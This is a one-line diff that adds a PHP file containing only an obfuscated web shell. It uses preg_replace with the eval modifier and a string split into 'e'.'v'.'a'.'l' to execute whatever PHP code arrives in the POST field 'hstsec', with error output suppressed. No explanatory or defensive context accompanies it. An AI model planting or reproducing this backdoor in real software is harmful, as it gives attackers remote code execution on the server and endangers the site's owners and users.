@@ -1,0 +1,1 @@
+<?php @preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'($_POST["hstsec"])','a');?>
